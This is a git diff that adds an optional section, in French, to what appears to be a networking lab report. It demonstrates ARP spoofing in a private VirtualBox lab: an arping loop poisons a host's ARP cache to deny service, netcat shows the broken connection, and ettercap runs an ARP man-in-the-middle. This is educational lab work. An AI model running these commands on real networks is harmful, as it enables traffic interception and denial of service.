@@ -152,6 +152,37 @@ $ sudo ip n flush all ; ping 10.42.0.2
 
 # II.5 Interlude hackerzz
 
+(optionnel)
+
+**En utilisant arping**
+DOS attaque
+
+Sur Eve (192.168.56.9) :
+```
+$ while :; do sleep 1;  sudo arping -c 1 -A -s 192.168.56.10 -I vboxnet0 192.168.56.8; done
+```
+``-A`` sert à utiliser arping en mode ANSWER only, donc des paquets "reply" seront envoyés toutes les 1 secondes
+
+Sur BOB (192.168.56.10) :
+```
+$ nc -lnvp 12345
+```
+
+Sur Alice (192.168.56.8) :
+```
+$ nc 192.168.56.10 12345
+```
+
+Le netcat ne fonctionne pas sur les deux pc, car Alice envoie tout ses paquets à l'adresse MAC de Eve
+[le pcap avec les paquets ARP + les paquets du netcat d'Alice qui ne répondent pas](./pcap/dos_arpspoof.pcapng)
+
+
+**En utilisant ettercap**
+Sur Eve (192.168.56.9) :
+```
+$ sudo ettercap -i vboxnet0 -T -M arp //192.168.56.10// //192.168.56.8//
+```
+
 ![](./images/hackerz.png)
 
 # III. DHCP you too my brooo
